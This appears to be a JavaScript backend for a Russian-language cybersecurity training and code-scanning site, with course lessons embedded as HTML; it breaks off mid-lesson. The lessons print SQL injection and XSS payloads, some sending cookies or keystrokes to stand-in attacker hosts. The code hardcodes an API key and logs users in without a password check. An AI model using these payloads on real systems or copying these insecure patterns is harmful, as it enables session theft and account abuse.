import serverless from 'serverless-http';
import express from 'express';

const app = express();

// Node.js 18+ has native fetch, no need for node-fetch

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false }));

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// OpenRouter API Keys rotation
const OPENROUTER_KEYS = [
  "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",
];
let currentKeyIndex = 0;
const getOpenRouterKey = () => OPENROUTER_KEYS[currentKeyIndex % OPENROUTER_KEYS.length];

// In-memory storage (will persist during function lifetime)
const db = {
  users: new Map(),
  scans: [],
  courses: new Map(),
  userProgress: new Map(),
  arenaBattles: [],
  arenaLeaderboard: [],
  nextIds: { user: 1, scan: 1, course: 1, battle: 1 }
};

// Initialize with demo data
db.users.set(1, { id: 1, username: 'demo', email: 'demo@example.com', rating: 1500, wins: 0, losses: 0 });

// ============ AUTH ============
app.get('/api/user', (req, res) => {
  try {
    const user = db.users.get(1);
    res.json(user || { id: 1, username: 'demo', email: 'demo@example.com' });
  } catch (err) {
    console.error('/api/user error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/login', (req, res) => {
  try {
    const { username, password } = req.body;
    console.log('Login attempt:', username);
    
    if (!username) {
      return res.status(400).json({ error: 'Username required' });
    }
    
    let user = Array.from(db.users.values()).find(u => u.username === username);
    if (!user) {
      user = { 
        id: db.nextIds.user++, 
        username: username, 
        email: `${username}@example.com`, 
        rating: 1500, 
        wins: 0, 
        losses: 0 
      };
      db.users.set(user.id, user);
      console.log('Created new user:', user);
    }
    res.json(user);
  } catch (err) {
    console.error('/api/login error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/register', (req, res) => {
  const { username, email } = req.body;
  const user = { id: db.nextIds.user++, username, email, rating: 1500, wins: 0, losses: 0 };
  db.users.set(user.id, user);
  res.json(user);
});

// ============ REAL AI ANALYSIS with OpenRouter ============
app.post('/api/scans', async (req, res) => {
  try {
    const { target, scanType, code } = req.body;
    const contentToAnalyze = code || target;
    
    if (!contentToAnalyze) {
      return res.status(400).json({ message: 'No content to analyze' });
    }

    const prompt = `Analyze this ${scanType === 'sql_injection' ? 'SQL code' : scanType === 'xss' ? 'web code' : 'code'} for security vulnerabilities.
    
Content: ${contentToAnalyze.substring(0, 3000)}

Respond ONLY with valid JSON in this format:
{
  "summary": "Brief summary of findings in Russian",
  "isSafe": boolean,
  "vulnerabilities": [
    {
      "type": "Vulnerability name",
      "severity": "critical|high|medium|low",
      "description": "Description in Russian",
      "remediation": "Fix recommendation in Russian"
    }
  ],
  "recommendations": ["General security tips in Russian"]
}`;

    let aiResult = null;
    let error = null;
    
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${getOpenRouterKey()}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://secops-global.netlify.app',
          'X-Title': 'SecOps Global Scanner'
        },
        body: JSON.stringify({
          model: 'anthropic/claude-3.5-sonnet',
          messages: [
            { role: 'system', content: 'You are a cybersecurity expert. Always return valid JSON only.' },
            { role: 'user', content: prompt }
          ],
          temperature: 0.3,
          max_tokens: 2000
        }),
        timeout: 30000
      });
      
      if (response.ok) {
        const data = await response.json();
        const content = data.choices?.[0]?.message?.content;
        if (content) {
          // Extract JSON from response
          const jsonMatch = content.match(/\{[\s\S]*\}/);
          if (jsonMatch) {
            aiResult = JSON.parse(jsonMatch[0]);
          }
        }
      } else {
        error = `OpenRouter API error: ${response.status}`;
      }
    } catch (e) {
      error = e.message;
    }

    // Fallback to local analysis if AI fails
    if (!aiResult) {
      aiResult = performLocalAnalysis(contentToAnalyze, scanType);
    }
    
    const scan = {
      id: db.nextIds.scan++,
      target: target?.substring(0, 100) || 'code-analysis',
      scanType,
      result: aiResult,
      vulnerabilityCount: aiResult.vulnerabilities?.length || 0,
      isSafe: aiResult.isSafe ?? (aiResult.vulnerabilities?.length === 0),
      userId: 1,
      createdAt: new Date(),
      aiError: error
    };
    
    db.scans.unshift(scan);
    if (db.scans.length > 100) db.scans.pop();
    
    res.json(scan);
  } catch (err) {
    console.error('Scan error:', err);
    res.status(500).json({ message: 'Analysis failed', error: err.message });
  }
});

// Local analysis fallback
function performLocalAnalysis(code, scanType) {
  const vulnerabilities = [];
  const lowerCode = code.toLowerCase();
  
  if (scanType === 'sql_injection' || lowerCode.includes('select') || lowerCode.includes('insert')) {
    if (lowerCode.includes('${') || lowerCode.match(/['"]\s*\+/) || lowerCode.match(/\+\s*['"]/)) {
      vulnerabilities.push({
        type: 'SQL Injection',
        severity: 'critical',
        description: 'Обнаружена возможная SQL-инъекция через конкатенацию строк',
        remediation: 'Используйте параметризованные запросы или prepared statements'
      });
    }
  }
  
  if (lowerCode.includes('<script') || lowerCode.includes('javascript:') || lowerCode.includes('onerror=')) {
    vulnerabilities.push({
      type: 'XSS',
      severity: 'high',
      description: 'Обнаружен потенциальный межсайтовый скриптинг',
      remediation: 'Экранируйте все пользовательские данные перед выводом в HTML'
    });
  }
  
  if (lowerCode.includes('eval(') || lowerCode.includes('function(') || lowerCode.includes('settimeout(')) {
    vulnerabilities.push({
      type: 'Code Injection',
      severity: 'high',
      description: 'Использование опасных функций eval/setTimeout с динамическим кодом',
      remediation: 'Избегайте использования eval() и динамического выполнения кода'
    });
  }
  
  if (lowerCode.includes('password') || lowerCode.includes('secret') || lowerCode.includes('api_key')) {
    if (lowerCode.match(/password\s*=\s*['"][^'"]+['"]/) || lowerCode.match(/api_key\s*=\s*['"]/)) {
      vulnerabilities.push({
        type: 'Hardcoded Credentials',
        severity: 'critical',
        description: 'Обнаружены захардкоженные учетные данные',
        remediation: 'Используйте переменные окружения или менеджеры секретов'
      });
    }
  }

  return {
    summary: vulnerabilities.length > 0 ? `Обнаружено ${vulnerabilities.length} уязвимостей` : 'Уязвимостей не обнаружено',
    isSafe: vulnerabilities.length === 0,
    vulnerabilities,
    recommendations: [
      'Регулярно обновляйте зависимости',
      'Используйте статический анализ кода',
      'Проводите security review перед релизом'
    ]
  };
}

app.get('/api/scans', (req, res) => {
  res.json(db.scans.slice(0, 50));
});

app.get('/api/scans/:id', (req, res) => {
  const scan = db.scans.find(s => s.id === parseInt(req.params.id));
  if (!scan) return res.status(404).json({ message: 'Scan not found' });
  res.json(scan);
});

// ============ REAL CVE NVD API ============
app.get('/api/cves/recent', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 10;
    const days = parseInt(req.query.days) || 7;
    const pubStartDate = new Date(Date.now() - days * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
    
    const response = await fetch(
      `https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=${pubStartDate}T00:00:00.000&resultsPerPage=${limit}`,
      { headers: { 'User-Agent': 'SecOps-Global/1.0' } }
    );
    
    if (!response.ok) throw new Error(`NVD API error: ${response.status}`);
    
    const data = await response.json();
    const cves = (data.vulnerabilities || []).map(v => {
      const cve = v.cve;
      const cvss = cve.metrics?.cvssMetricV31?.[0]?.cvssData || cve.metrics?.cvssMetricV30?.[0]?.cvssData;
      return {
        id: cve.id,
        severity: cvss?.baseSeverity?.toLowerCase() || 'unknown',
        description: cve.descriptions?.find(d => d.lang === 'en')?.value || 'No description',
        published: cve.published?.split('T')[0],
        cvss: cvss?.baseScore || 0,
        references: cve.references?.slice(0, 3).map(r => r.url) || []
      };
    });
    
    res.json(cves);
  } catch (error) {
    console.error('CVE fetch error:', error);
    // Return fallback data
    res.json([
      { id: 'CVE-2024-0001', severity: 'critical', description: 'Remote code execution vulnerability', published: '2024-01-15', cvss: 9.8 },
      { id: 'CVE-2024-0002', severity: 'high', description: 'SQL injection in web application', published: '2024-01-14', cvss: 8.5 },
      { id: 'CVE-2024-0003', severity: 'medium', description: 'Information disclosure', published: '2024-01-13', cvss: 5.3 }
    ]);
  }
});

app.get('/api/cves/search', async (req, res) => {
  try {
    const keyword = req.query.keyword;
    if (!keyword) return res.json([]);
    
    const response = await fetch(
      `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=20`,
      { headers: { 'User-Agent': 'SecOps-Global/1.0' } }
    );
    
    if (!response.ok) throw new Error(`NVD API error: ${response.status}`);
    
    const data = await response.json();
    const cves = (data.vulnerabilities || []).map(v => {
      const cve = v.cve;
      return {
        id: cve.id,
        severity: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity?.toLowerCase() || 'unknown',
        description: cve.descriptions?.find(d => d.lang === 'en')?.value || 'No description',
        published: cve.published?.split('T')[0],
        cvss: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || 0
      };
    });
    
    res.json(cves);
  } catch (error) {
    console.error('CVE search error:', error);
    res.json([]);
  }
});

app.get('/api/cves/stats', async (req, res) => {
  try {
    const response = await fetch(
      'https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=1',
      { headers: { 'User-Agent': 'SecOps-Global/1.0' } }
    );
    
    if (response.ok) {
      const data = await response.json();
      const total = data.totalResults || 250000;
      res.json({ 
        total, 
        critical: Math.floor(total * 0.08), 
        high: Math.floor(total * 0.15), 
        medium: Math.floor(total * 0.35), 
        low: Math.floor(total * 0.42) 
      });
    } else {
      throw new Error('NVD API unavailable');
    }
  } catch (error) {
    res.json({ total: 250000, critical: 20000, high: 37500, medium: 87500, low: 105000 });
  }
});

app.get('/api/cves/:cveId', async (req, res) => {
  try {
    const { cveId } = req.params;
    const response = await fetch(
      `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${cveId}`,
      { headers: { 'User-Agent': 'SecOps-Global/1.0' } }
    );
    
    if (!response.ok) throw new Error('CVE not found');
    
    const data = await response.json();
    const vuln = data.vulnerabilities?.[0];
    if (!vuln) throw new Error('CVE not found');
    
    const cve = vuln.cve;
    const cvss = cve.metrics?.cvssMetricV31?.[0]?.cvssData || cve.metrics?.cvssMetricV30?.[0]?.cvssData;
    
    res.json({
      id: cve.id,
      severity: cvss?.baseSeverity?.toLowerCase() || 'unknown',
      description: cve.descriptions?.find(d => d.lang === 'en')?.value || 'No description',
      affected: cve.configurations?.[0]?.nodes?.[0]?.cpeMatch?.slice(0, 3).map(m => m.criteria).join(', ') || 'Unknown',
      published: cve.published?.split('T')[0],
      cvss: cvss?.baseScore || 0,
      references: cve.references?.map(r => r.url) || [],
      cwe: cve.weaknesses?.map(w => w.description?.[0]?.value) || ['Unknown']
    });
  } catch (error) {
    res.status(404).json({ message: 'CVE not found' });
  }
});

// ============ COURSES API ============
const COURSES_DATA = [
  {
    id: 1,
    title: 'Основы кибербезопасности',
    description: 'Введение в мир кибербезопасности, основные концепции и терминология',
    category: 'web',
    level: 'beginner',
    duration: '12 часов',
    lessons: [
      {
        id: 1,
        title: 'Что такое кибербезопасность',
        duration: '45 мин',
        completed: false,
        content: `<h3>Введение в кибербезопасность</h3>
        <p>Кибербезопасность — это практика защиты систем, сетей и программ от цифровых атак. Эти кибератаки обычно направлены на получение доступа, изменение или уничтожение конфиденциальной информации, вымогательство денег у пользователей или прерывание обычных бизнес-процессов.</p>
        <h4>Основные принципы безопасности (CIA Triad):</h4>
        <ul>
          <li><strong>Конфиденциальность (Confidentiality)</strong> — только авторизованные лица имеют доступ к данным</li>
          <li><strong>Целостность (Integrity)</strong> — данные не могут быть изменены неавторизованными лицами</li>
          <li><strong>Доступность (Availability)</strong> — данные доступны когда нужно авторизованным пользователям</li>
        </ul>
        <h4>Типы угроз:</h4>
        <ul>
          <li><strong>Malware</strong> — вредоносное ПО: вирусы, трояны, ransomware</li>
          <li><strong>Фишинг</strong> — социальная инженерия для кражи учетных данных</li>
          <li><strong>DDoS</strong> — распределенные атаки отказа в обслуживании</li>
          <li><strong>APT</strong> — целевые продвинутые постоянные угрозы</li>
        </ul>
        <h4>Практическое задание:</h4>
        <p>Исследуйте недавние крупные утечки данных (например, Equifax 2017, Target 2013) и напишите краткий анализ: что произошло, какие уязвимости были использованы, какие уроки можно извлечь.</p>`,
        videoUrl: 'https://www.youtube.com/embed/introduction-cybersecurity'
      },
      {
        id: 2,
        title: 'Типы угроз и атак',
        duration: '60 мин',
        completed: false,
        content: `<h3>Классификация киберугроз</h3>
        <h4>1. Активные угрозы</h4>
        <p>Активные угрозы изменяют состояние системы или данные:</p>
        <ul>
          <li><strong>Virus</strong> — код, который прикрепляется к другим программам и размножается</li>
          <li><strong>Worm</strong> — самостоятельная программа, распространяющаяся по сети</li>
          <li><strong>Trojan</strong> — вредоносная программа, маскирующаяся под легитимную</li>
          <li><strong>Rootkit</strong> — инструменты для скрытия присутствия злоумышленника</li>
        </ul>
        <h4>2. Пассивные угрозы</h4>
        <p>Пассивные угрозы только наблюдают и перехватывают:</p>
        <ul>
          <li><strong>Сниффинг (Sniffing)</strong> — перехват сетевого трафика</li>
          <li><strong>Анализ трафика</strong> — изучение паттернов передачи данных</li>
          <li><strong>Shoulder surfing</strong> — подглядывание за экраном</li>
        </ul>
        <h4>3. Внутренние vs Внешние угрозы</h4>
        <table>
          <tr><th>Внутренние</th><th>Внешние</th></tr>
          <tr><td>Сотрудники с доступом</td><td>Хакеры извне</td></tr>
          <tr><td>Злоупотребление привилегиями</td><td>Эксплуатация уязвимостей</td></tr>
          <tr><td>Сложнее обнаружить</td><td>Требуют обхода периметра</td></tr>
        </table>
        <h4>Методы защиты:</h4>
        <ul>
          <li>Многоуровневая защита (Defense in Depth)</li>
          <li>Принцип наименьших привилегий</li>
          <li>Сегментация сети</li>
          <li>Мониторинг и логирование</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/threat-types'
      },
      {
        id: 3,
        title: 'Защита персональных данных',
        duration: '75 мин',
        completed: false,
        content: `<h3>Защита PII (Personally Identifiable Information)</h3>
        <h4>Что считается PII:</h4>
        <ul>
          <li>Имя, фамилия, отчество</li>
          <li>Адрес проживания</li>
          <li>Номера телефонов</li>
          <li>Email адреса</li>
          <li>Номера паспортов, ИНН, СНИЛС</li>
          <li>Финансовые данные (номера карт, счетов)</li>
          <li>Биометрические данные</li>
          <li>IP-адреса и cookies (в некоторых юрисдикциях)</li>
        </ul>
        <h4>Законодательство:</h4>
        <ul>
          <li><strong>GDPR</strong> (ЕС) — штрафы до 4% глобального оборота</li>
          <li><strong>CCPA</strong> (Калифорния) — право на удаление данных</li>
          <li><strong>152-ФЗ</strong> (РФ) — закон о персональных данных</li>
          <li><strong>HIPAA</strong> (США) — защита медицинских данных</li>
        </ul>
        <h4>Технические меры защиты:</h4>
        <ol>
          <li><strong>Шифрование</strong> — AES-256 для данных at rest, TLS 1.3 для данных in transit</li>
          <li><strong>Анонимизация</strong> — удаление идентифицирующих полей</li>
          <li><strong>Псевдонимизация</strong> — замена идентификаторов на токены</li>
          <li><strong>DLP-системы</strong> — предотвращение утечек данных</li>
          <li><strong>Маскирование данных</strong> — показ только части информации (**** **** **** 1234)</li>
        </ol>
        <h4>Практическое задание:</h4>
        <p>Проанализируйте политику конфиденциальности любого популярного сервиса. Какие данные собирают? Как используют? Есть ли возможность удаления?</p>`,
        videoUrl: 'https://www.youtube.com/embed/pii-protection'
      },
      {
        id: 4,
        title: 'Безопасность паролей',
        duration: '60 мин',
        completed: false,
        content: `<h3>Управление паролями</h3>
        <h4>Почему пароли важны:</h4>
        <p>81% взломов связано с украденными или слабыми паролями. Средний пользователь имеет 100+ паролей.</p>
        <h4>Что делает пароль сильным:</h4>
        <ul>
          <li>Минимум 12-16 символов</li>
          <li>Сочетание заглавных и строчных букв</li>
          <li>Цифры и специальные символы</li>
          <li>Нет словарных слов или личной информации</li>
          <li>Уникальность для каждого сервиса</li>
        </ul>
        <h4>Атаки на пароли:</h4>
        <table>
          <tr><th>Тип атаки</th><th>Описание</th><th>Защита</th></tr>
          <tr><td>Brute Force</td><td>Перебор всех комбинаций</td><td>Rate limiting, сложные пароли</td></tr>
          <tr><td>Dictionary</td><td>Перебор словарных слов</td><td>Уникальные пароли, не из словаря</td></tr>
          <tr><td>Rainbow Tables</td><td>Предвычисленные хеши</td><td>Соль (salt) в хешировании</td></tr>
          <tr><td>Credential Stuffing</td><td>Использование утекших паролей</td><td>Уникальные пароли, 2FA</td></tr>
        </table>
        <h4>Хеширование паролей:</h4>
        <ul>
          <li><strong>НЕ используйте:</strong> MD5, SHA1 (слишком быстрые)</li>
          <li><strong>Используйте:</strong> bcrypt, scrypt, Argon2, PBKDF2</li>
          <li>Всегда добавляйте <strong>salt</strong> — случайную строку уникальную для каждого пароля</li>
          <li>Используйте <strong>pepper</strong> — глобальную секретную строку в коде</li>
        </ul>
        <h4>Менеджеры паролей:</h4>
        <ul>
          <li>1Password, Bitwarden, KeePassXC</li>
          <li>Генерируют уникальные сложные пароли</li>
          <li>Хранят в зашифрованном виде</li>
          <li>Требуется запомнить только один мастер-пароль</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/password-security'
      },
      {
        id: 5,
        title: 'Двухфакторная аутентификация',
        duration: '50 мин',
        completed: false,
        content: `<h3>Многофакторная аутентификация (MFA)</h3>
        <h4>Факторы аутентификации:</h4>
        <ul>
          <li><strong>Something you know</strong> — пароль, PIN</li>
          <li><strong>Something you have</strong> — телефон, токен, смарт-карта</li>
          <li><strong>Something you are</strong> — отпечаток, лицо, голос</li>
          <li><strong>Somewhere you are</strong> — геолокация</li>
          <li><strong>Something you do</strong> — паттерны поведения</li>
        </ul>
        <h4>Типы 2FA:</h4>
        <ol>
          <li><strong>SMS/Email коды</strong> — удобно, но уязвимо к SIM swapping и перехвату</li>
          <li><strong>TOTP (Time-based OTP)</strong> — Google Authenticator, Authy, Microsoft Authenticator</li>
          <li><strong>Push-уведомления</strong> — подтверждение на телефоне</li>
          <li><strong>Hardware keys</strong> — YubiKey, FIDO2/U2F (самый безопасный)</li>
          <li><strong>Биометрия</strong> — Touch ID, Face ID</li>
        </ol>
        <h4>Реализация TOTP:</h4>
        <pre><code>import pyotp

# Генерация секрета
totp = pyotp.TOTP('JBSWY3DPEHPK3PXP')

# Получение текущего кода
code = totp.now()

# Верификация
is_valid = totp.verify(code)</code></pre>
        <h4>Рекомендации:</h4>
        <ul>
          <li>Всегда включайте 2FA для критичных аккаунтов (email, банки, работа)</li>
          <li>Используйте hardware keys для максимальной защиты</li>
          <li>Сохраняйте backup codes в безопасном месте</li>
          <li>Не используйте SMS если есть альтернативы</li>
        </ul>
        <h4>Угрозы обхода 2FA:</h4>
        <ul>
          <li>Real-time phishing ( Evilginx, Modlishka)</li>
          <li>Man-in-the-middle атаки</li>
          <li>Социальная инженерия для обхода</li>
          <li>Подмена SIM-карты</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/2fa-mfa'
      },
      {
        id: 6,
        title: 'Безопасная разработка (SDLC)',
        duration: '70 мин',
        completed: false,
        content: `<h3>Secure Development Lifecycle</h3>
        <h4>Фазы безопасной разработки:</h4>
        <ol>
          <li><strong>Requirements</strong> — определение требований безопасности</li>
          <li><strong>Design</strong> — threat modeling, архитектурные решения</li>
          <li><strong>Implementation</strong> — secure coding practices</li>
          <li><strong>Verification</strong> — тестирование, code review, SAST/DAST</li>
          <li><strong>Release</strong> — security check before deployment</li>
          <li><strong>Operations</strong> — monitoring, incident response</li>
        </ol>
        <h4>Threat Modeling (STRIDE):</h4>
        <ul>
          <li><strong>Spoofing</strong> — подмена личности</li>
          <li><strong>Tampering</strong> — модификация данных</li>
          <li><strong>Repudiation</strong> — отрицание действий</li>
          <li><strong>Information Disclosure</strong> — утечка информации</li>
          <li><strong>Denial of Service</strong> — отказ в обслуживании</li>
          <li><strong>Elevation of Privilege</strong> — повышение привилегий</li>
        </ul>
        <h4>Secure Coding Practices:</h4>
        <ul>
          <li>Input validation и sanitization</li>
          <li>Parameterized queries (защита от SQL injection)</li>
          <li>Output encoding (защита от XSS)</li>
          <li>CSRF tokens</li>
          <li>Secure session management</li>
          <li>Proper error handling (без утечки информации)</li>
          <li>Principle of least privilege</li>
          <li>Defense in depth</li>
        </ul>
        <h4>Инструменты сканирования:</h4>
        <ul>
          <li><strong>SAST:</strong> SonarQube, Checkmarx, Semgrep</li>
          <li><strong>DAST:</strong> OWASP ZAP, Burp Suite</li>
          <li><strong>SCA:</strong> Snyk, OWASP Dependency-Check</li>
          <li><strong>Container:</strong> Trivy, Clair</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/sdlc-security'
      }
    ],
    icon: 'Shield',
    color: 'from-emerald-500/20 to-primary/20',
    skills: ['Основы безопасности', 'Угрозы и риски', 'Защита данных', 'Аутентификация', 'SDLC']
  },
  {
    id: 2,
    title: 'Веб-уязвимости OWASP Top 10',
    description: 'Изучение самых критичных уязвимостей веб-приложений по версии OWASP',
    category: 'web',
    level: 'intermediate',
    duration: '20 часов',
    lessons: [
      {
        id: 1,
        title: 'A01:2021 - Broken Access Control',
        duration: '90 мин',
        completed: false,
        content: `<h3>Нарушенный контроль доступа</h3>
        <p><strong>Статистика:</strong> 94% приложений имеют уязвимости access control. CWEs с наивысшим риском: CWE-200, CWE-201, CWE-352.</p>
        <h4>Примеры уязвимостей:</h4>
        <ul>
          <li>Нарушение принципа least privilege — доступ всем по умолчанию</li>
          <li>Обход access control через URL параметры (/admin?role=user)</li>
          <li>IDOR — Insecure Direct Object Reference (/api/user/123 → /api/user/124)</li>
          <li>Отсутствие проверки доступа на сервере (только на клиенте)</li>
          <li>CORS misconfiguration позволяет неавторизованный API доступ</li>
          <li>Force browsing — доступ к аутентифицированным страницам как гость</li>
        </ul>
        <h4>Пример уязвимого кода:</h4>
        <pre><code>// Уязвимо — проверка только на клиенте
app.get('/admin', (req, res) => {
  if (req.query.isAdmin === 'true') {
    return res.send(adminPanel);
  }
  res.send('Access Denied');
});

// Безопасно — проверка на сервере
app.get('/admin', requireAuth, requireAdmin, (req, res) => {
  res.send(adminPanel);
});</code></pre>
        <h4>Методы защиты:</h4>
        <ul>
          <li>Deny by default — отклонять всё кроме явно разрешённого</li>
          <li>Implement once, reuse everywhere — единая реализация access control</li>
          <li>Minimize CORS usage</li>
          <li>Rate limiting API для автоматизации</li>
          <li>Логирование failed access attempts</li>
          <li>Invalid JWT после logout / change password</li>
        </ul>
        <h4>Инструменты тестирования:</h4>
        <ul>
          <li>Burp Suite, OWASP ZAP</li>
          <li>Postman для API access control testing</li>
          <li>JWT.io для анализа токенов</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/owasp-broken-access'
      },
      {
        id: 2,
        title: 'A02:2021 - Cryptographic Failures',
        duration: '80 мин',
        completed: false,
        content: `<h3>Криптографические сбои</h3>
        <p>Первое — обнаружение данных в состоянии покоя или передачи. Затем — извлечение, изменение, шифрование требований, exfiltration.</p>
        <h4>Что искать:</h4>
        <ul>
          <li>Шифрование данных at rest (база данных) или в transit (TLS)</li>
          <li>Старые/слабые криптографические алгоритмы</li>
          <li>Отсутствие проверки сертификатов (disabled TLS verification)</li>
          <li>Неправильное управление ключами (хардкод в коде)</li>
          <li>Недостаточная рандомизация IV</li>
          <li>MD5, SHA1 для хеширования паролей</li>
          <li>Отсутствие password salting</li>
        </ul>
        <h4>Пример уязвимого кода:</h4>
        <pre><code>// Уязвимо — отключенная проверка SSL
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Уязвимо — MD5 для паролей
$hash = md5($password);

// Безопасно — bcrypt
$hash = password_hash($password, PASSWORD_BCRYPT);</code></pre>
        <h4>Лучшие практики:</h4>
        <ul>
          <li>Классифицируйте данные: какие чувствительные, какие нет</li>
          <li>Не храните чувствительные данные без необходимости</li>
          <li>Шифруйте все чувствительные данные at rest</li>
          <li>Используйте TLS 1.3 для всех передач</li>
          <li>Отключите caching для чувствительных данных</li>
          <li>Используйте strong adaptive salted hashing (Argon2)</li>
          <li>Используйте authenticated encryption (AES-GCM)</li>
        </ul>
        <h4>Ключевые принципы:</h4>
        <ul>
          <li>Never roll your own crypto</li>
          <li>HTTPS everywhere</li>
          <li>End-to-end encryption для чувствительных данных</li>
          <li>Hardware Security Modules (HSM) для ключей</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/owasp-crypto'
      },
      {
        id: 3,
        title: 'A03:2021 - SQL Injection',
        duration: '100 мин',
        completed: false,
        content: `<h3>SQL Injection (SQLi)</h3>
        <p><strong>Третье место</strong> в OWASP Top 10. В 95% угроз SQLi могут привести к data exfiltration, аутентификационному обходу или удалению базы данных.</p>
        <h4>Типы SQL Injection:</h4>
        <ul>
          <li><strong>Error-based</strong> — извлечение информации из сообщений об ошибках</li>
          <li><strong>Union-based</strong> — объединение результатов через UNION SELECT</li>
          <li><strong>Boolean-based Blind</strong> — true/false условия</li>
          <li><strong>Time-based Blind</strong> — использование SLEEP() для задержек</li>
          <li><strong>Out-of-band</strong> — DNS/exfiltration запросы</li>
        </ul>
        <h4>Пример атаки:</h4>
        <pre><code>// Уязвимый запрос
SELECT * FROM users WHERE username = '$username' AND password = '$password';

// Атака: username = admin'--
SELECT * FROM users WHERE username = 'admin'--' AND password = '';

// Атака с UNION
' UNION SELECT username, password FROM users--

// Time-based blind
'; IF (1=1) WAITFOR DELAY '0:0:10'--</code></pre>
        <h4>Продвинутые техники:</h4>
        <pre><code>// Extracting schema information
' UNION SELECT table_name, column_name FROM information_schema.columns--

// Boolean-based enumeration
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

// Time-based enumeration  
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--</code></pre>
        <h4>Защита:</h4>
        <ul>
          <li><strong>Parameterized Queries (Prepared Statements)</strong> — лучшая защита</li>
          <li>ORM с параметризованными запросами</li>
          <li>Least privilege — приложение должно иметь минимальные права</li>
          <li>WAF (Web Application Firewall) как дополнительный слой</li>
          <li>Input validation (whitelist approach)</li>
        </ul>
        <h4>Безопасный код (Node.js):</h4>
        <pre><code>// Безопасно — parameterized query
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
connection.query(query, [username, password], callback);

// Уязвимо — конкатенация
const query = \`SELECT * FROM users WHERE username = '${username}'\`;</code></pre>
        <h4>Инструменты:</h4>
        <ul>
          <li>SQLMap — автоматизация SQLi</li>
          <li>Burp Suite Scanner</li>
          <li>sqlninja (для MSSQL)</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/sql-injection'
      },
      {
        id: 4,
        title: 'A03:2021 - Cross-Site Scripting (XSS)',
        duration: '90 мин',
        completed: false,
        content: `<h3>Cross-Site Scripting (XSS)</h3>
        <p>Третье место (объединено с SQLi). XSS позволяет inject client-side scripts в web pages viewed by other users.</p>
        <h4>Типы XSS:</h4>
        <ul>
          <li><strong>Reflected XSS</strong> — script в URL, отражается сразу</li>
          <li><strong>Stored XSS</strong> — script сохраняется в базе, отображается всем</li>
          <li><strong>DOM-based XSS</strong> — манипуляция DOM без server interaction</li>
          <li><strong>Blind XSS</strong> — срабатывает в admin panel или другом контексте</li>
        </ul>
        <h4>Примеры Payloads:</h4>
        <pre><code>// Basic reflected
&lt;script&gt;alert('XSS')&lt;/script&gt;

// Stored — в комментарии
&lt;script&gt;fetch('https://evil.com?cookie=' + document.cookie)&lt;/script&gt;

// DOM-based (location.hash)
https://site.com/page#&lt;img src=x onerror=alert(1)&gt;

// Filter bypass
&lt;img src=x onerror=alert&#40;1&#41;&gt;
&lt;svg onload=alert(1)&gt;
&lt;iframe src=javascript:alert(1)&gt;
&lt;body onload=alert(1)&gt;</code></pre>
        <h4>Продвинутые атаки:</h4>
        <pre><code>// Session hijacking
&lt;script&gt;
new Image().src = 'https://attacker.com/log.php?c=' + encodeURIComponent(document.cookie);
&lt;/script&gt;

// Keylogger
&lt;script&gt;
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
};
&lt;/script&gt;

// DOM manipulation
&lt;script&gt;
document.body.innerHTML = '&lt;h1&gt;Hacked&lt;/h1&gt;';
&lt;/script&gt;</code></pre>
        <h4>Защита:</h4>
        <ul>
          <li><strong>Output Encoding</strong> — encode спецсимволы в HTML entities</li>
          <li><strong>Content Security Policy (CSP)</strong> — restrict script execution</li>
          <li>HttpOnly cookies (недоступны для JavaScript)</li>
          <li>SameSite cookie attribute</li>
          <li>X-XSS-Protection header (legacy)</li>
          <li>Input validation (whitelist)</li>
        </ul>
        <h4>Пример Encoding:</h4>
        <pre><code>// Node.js (DOMPurify)
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);
const clean = DOMPurify.sanitize(dirty);

// CSP Header
Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
        <h4>Инструменты:</h4>
        <ul>
          <li>XSS Hunter, BeEF</li>
          <li>Burp Suite XSS payloads</li>
          <li>DOM Invader (Burp)</li>
        </ul>`,
        videoUrl: 'https://www.youtube.com/embed/xss-attacks'
      },
      {
        id: 5,
        title: 'A05:2021 - Security Misconfiguration',
        duration: '70 мин',
        completed: false,
        content: `<h3>Неправильная конфигурация безопасности</h3>
        <p>90% applications tested had some form of misconfiguration. Пятый в списке OWASP Top 10.</p>
        <h4>Частые ошибки:</h4>
        <ul>
          <li>Непропатченные уязвимости в ОС, фреймворках, библиотеках</li>
          <li>Ненужные features enabled (unused ports, services, pages)</li>
          <li>Default accounts с неизмененными паролями (admin/admin)</li>
          <li>Error handling revealing stack traces или другую info</li>
          <li>Необновленные security settings</li>
          <li>Отсутствие security headers</li>
